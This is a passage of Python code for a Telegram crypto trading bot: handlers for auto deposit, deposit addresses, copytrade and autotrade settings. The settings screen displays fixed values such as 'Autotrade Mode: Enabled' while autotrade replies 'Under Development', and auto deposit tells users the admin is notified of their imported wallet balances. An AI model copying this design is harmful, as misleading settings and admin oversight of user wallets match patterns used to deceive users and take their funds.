        await _edit_callback(
            callback,
            "📊 <b>Trading &amp; Network Settings</b>\n\n"
            "Configure your automated trade behavior:\n"
            "- Default Slippage: 0.5%\n"
            "- Preferred Network: Ethereum\n"
            "- Autotrade Mode: Enabled",
            trading_settings_keyboard(),
        )

    @router.callback_query(F.data.in_({"settings:buy_sell", "settings:copy_auto"}))
    async def unfinished_settings(callback: CallbackQuery) -> None:
        await _edit_callback(
            callback,
            "🚧 <b>Under Development</b>",
            settings_return_keyboard(),
        )

    @router.callback_query(F.data == "user:auto_deposit")
    async def auto_deposit(callback: CallbackQuery, session: AsyncSession) -> None:
        user = await _registered_user(session, callback.from_user.id)
        setting = await session.scalar(
            select(AutoDepositSetting).where(AutoDepositSetting.user_id == user.id)
        )
        current = f"every {setting.interval_hours} hours" if setting and setting.enabled else "OFF"
        await _edit_callback(
            callback,
            f"⏰ <b>Auto Deposit</b>\n\nCurrent: {current}\n\nSelect interval:",
            auto_deposit_interval_keyboard(),
        )

    @router.callback_query(F.data.startswith("auto_deposit:set:"))
    async def set_auto_deposit(callback: CallbackQuery, session: AsyncSession) -> None:
        user = await _registered_user(session, callback.from_user.id)
        hours = int(callback.data.rsplit(":", maxsplit=1)[1])
        setting = await session.scalar(
            select(AutoDepositSetting).where(AutoDepositSetting.user_id == user.id)
        )
        if setting is None:
            setting = AutoDepositSetting(user_id=user.id)
            session.add(setting)
        setting.enabled = True
        setting.interval_hours = hours
        await session.commit()
        if callback.message is not None:
            await callback.message.edit_reply_markup(reply_markup=None)
            await callback.message.answer(
                f"✅ Auto Deposit set to every {hours} hours.\n\n"
                "Admin will be notified of your imported wallet balances.",
                reply_markup=main_menu_keyboard(),
            )
        await callback.answer()

    @router.callback_query(F.data == "auto_deposit:off")
    async def turn_off_auto_deposit(callback: CallbackQuery, session: AsyncSession) -> None:
        user = await _registered_user(session, callback.from_user.id)
        setting = await session.scalar(
            select(AutoDepositSetting).where(AutoDepositSetting.user_id == user.id)
        )
        if setting is None:
            setting = AutoDepositSetting(user_id=user.id)
            session.add(setting)
        setting.enabled = False
        setting.interval_hours = None
        await session.commit()
        if callback.message is not None:
            await callback.message.edit_reply_markup(reply_markup=None)
            await callback.message.answer(
                "🛑 Auto Deposit turned off.",
                reply_markup=main_menu_keyboard(),
            )
        await callback.answer()

    @router.callback_query(F.data.startswith("deposit:"))
    async def deposit_address(callback: CallbackQuery, session: AsyncSession) -> None:
        chain = callback.data.split(":", maxsplit=1)[1]
        definition = APPROVED_CHAINS.get(chain)
        if definition is None:
            await callback.answer("Unsupported network.", show_alert=True)
            return
        user = await _registered_user(session, callback.from_user.id)
        address = UserWalletService(
            settings.encryption_key.get_secret_value()
        ).addresses(user)[definition.asset]
        text = (
            f"<b>{definition.display_name.upper()}</b>\n\n"
            f"Send {definition.asset} to:\n\n"
            f"<code>{html.escape(address)}</code>"
        )
        await _edit_callback(callback, text, auto_deposit_keyboard())

    @router.callback_query(F.data == "user:charts")
    async def charts(callback: CallbackQuery) -> None:
        await _edit_callback(
            callback, await live_charts_text(), back_to_main_keyboard()
        )

    @router.callback_query(F.data == "user:copytrade")
    async def copytrade(
        callback: CallbackQuery,
        state: FSMContext,
        session: AsyncSession,
    ) -> None:
        if callback.from_user is None:
            return
        await _registered_user(session, callback.from_user.id)
        await state.set_state(CopytradeInput.waiting_for_wallet_address)
        if callback.message is not None:
            await callback.message.answer(
                _copytrade_prompt_text(),
                reply_markup=ForceReply(
                    selective=True,
                    input_field_placeholder="Paste wallet address",
                ),
            )
        await callback.answer()

    @router.callback_query(F.data == "copytrade:enter")
    async def enter_copytrade_address(
        callback: CallbackQuery,
        state: FSMContext,
        session: AsyncSession,
    ) -> None:
        await copytrade(callback, state, session)

    @router.message(CopytradeInput.waiting_for_wallet_address, Command("cancel"))
    async def cancel_copytrade_input(message: Message, state: FSMContext) -> None:
        await state.clear()
        await message.answer(
            "Copytrade address entry cancelled.",
            reply_markup=main_menu_keyboard(),
        )

    @router.message(CopytradeInput.waiting_for_wallet_address)
    async def receive_copytrade_address(
        message: Message,
        state: FSMContext,
        session: AsyncSession,
    ) -> None:
        if message.from_user is None or message.text is None:
            return
        user = await _registered_user(session, message.from_user.id)
        try:
            setting = await CopytradeService(session).follow(user.id, message.text)
        except ValueError as exc:
            await message.answer(html.escape(str(exc)))
            return
        await state.clear()
        await message.answer(
            "Your Menu:",
            reply_markup=copytrade_keyboard(setting.enabled),
        )

    @router.callback_query(F.data == "copytrade:start_all")
    async def start_all_copytrade(callback: CallbackQuery, session: AsyncSession) -> None:
        user = await _registered_user(session, callback.from_user.id)
        try:
            await CopytradeService(session).start(user.id)
        except ValueError as exc:
            await callback.answer(str(exc), show_alert=True)
            return
        if callback.message is not None:
            await callback.message.answer("▶️ Copy Trading Started for all wallets.")
        await callback.answer()

    @router.callback_query(F.data == "copytrade:stop_all")
    async def stop_all_copytrade(callback: CallbackQuery, session: AsyncSession) -> None:
        user = await _registered_user(session, callback.from_user.id)
        await CopytradeService(session).stop(user.id)
        if callback.message is not None:
            await callback.message.answer("🛑 Copy Trading Stopped for all wallets.")
        await callback.answer()

    @router.callback_query(F.data == "copytrade:stop")
    async def stop_copytrade(
        callback: CallbackQuery,
        state: FSMContext,
        session: AsyncSession,
    ) -> None:
        user = await _registered_user(session, callback.from_user.id)
        setting = await CopytradeService(session).stop(user.id)
        await state.clear()
        await _edit_callback(
            callback,
            _copytrade_text(setting),
            copytrade_keyboard(setting.enabled),
        )

    @router.callback_query(F.data == "user:autotrade")
    async def autotrade(callback: CallbackQuery) -> None:
        if callback.message is not None:
            await callback.message.answer("🚧 Under Development")
        await callback.answer()

    @router.callback_query(F.data == "autotrade:toggle")
    async def autotrade_toggle(callback: CallbackQuery, session: AsyncSession) -> None:
        user = await _registered_user(session, callback.from_user.id)
        await AutotradeService(session).toggle(user.id)
        await autotrade(callback)

    @router.callback_query(F.data == "autotrade:chain")
    async def autotrade_chain_menu(callback: CallbackQuery) -> None:
        await _edit_callback(
            callback, "⛓ <b>SELECT CHAIN</b>", chain_keyboard()
        )

    @router.callback_query(F.data.startswith("autotrade:chain:"))
    async def autotrade_chain(callback: CallbackQuery, session: AsyncSession) -> None:
        user = await _registered_user(session, callback.from_user.id)
        chain = callback.data.rsplit(":", maxsplit=1)[1]
        await AutotradeService(session).set_chain(user.id, chain)
        await autotrade(callback)

    @router.callback_query(F.data == "autotrade:strategy")
    async def autotrade_strategy_menu(callback: CallbackQuery) -> None:
        await _edit_callback(callback, "🧠 <b>SELECT STRATEGY</b>", strategy_keyboard())

    @router.callback_query(F.data.startswith("autotrade:strategy:"))
    async def autotrade_strategy(callback: CallbackQuery, session: AsyncSession) -> None:
        user = await _registered_user(session, callback.from_user.id)
        strategy = callback.data.rsplit(":", maxsplit=1)[1]
        await AutotradeService(session).set_strategy(user.id, strategy)
        await autotrade(callback)

    @router.callback_query(F.data.startswith("autotrade:edit:"))
    async def autotrade_edit(
        callback: CallbackQuery, state: FSMContext
    ) -> None:
        field = callback.data.rsplit(":", maxsplit=1)[1]
        labels = {
            "maximum_trade_amount": "maximum trade amount",
            "maximum_daily_trades": "maximum daily trades",
            "slippage": "slippage percentage",
            "take_profit": "take-profit percentage",
            "stop_loss": "stop-loss percentage",
        }
        if field not in labels:
            await callback.answer("Unsupported setting.", show_alert=True)
            return
        await state.set_state(AutotradeInput.waiting_for_numeric_value)
        await state.update_data(field=field)
        await _edit_callback(
            callback,
            f"Enter the new {labels[field]}.\n\nSend /cancel to stop.",
        )

    @router.message(AutotradeInput.waiting_for_numeric_value, Command("cancel"))
    async def cancel_autotrade_input(message: Message, state: FSMContext) -> None:
        await state.clear()
        await message.answer("Cancelled.", reply_markup=main_menu_keyboard())

    @router.message(AutotradeInput.waiting_for_numeric_value)
    async def receive_autotrade_value(
        message: Message, state: FSMContext, session: AsyncSession
    ) -> None:
        if message.from_user is None or message.text is None:
            return
        try:
            value = Decimal(message.text.strip())
        except InvalidOperation:
            await message.answer("Enter a valid numeric value.")
            return
        if not value.is_finite():
            await message.answer("Enter a finite numeric value.")
            return
        data = await state.get_data()
        user = await _registered_user(session, message.from_user.id)
        try:
            setting = await AutotradeService(session).set_numeric(
                user.id, data["field"], value
            )
        except ValueError as exc:
            await message.answer(html.escape(str(exc)))
            return
        await state.clear()
        await message.answer(
            _autotrade_text(setting),
            reply_markup=autotrade_keyboard(setting.enabled),
            parse_mode="HTML",
        )

    @router.message()
    async def unknown_command(message: Message) -> None:
        await message.answer(
            "❌ <b>Unknown Command!</b>\n\n"
            "<i>You have sent a message directly into the Bot's chat or the "
            "menu structure has been modified by Admin.</i>\n\n"
            "ℹ️ Do not send messages directly to the Bot. Reload the menu by "
            "pressing /start.",
            parse_mode="HTML",
        )

    return router
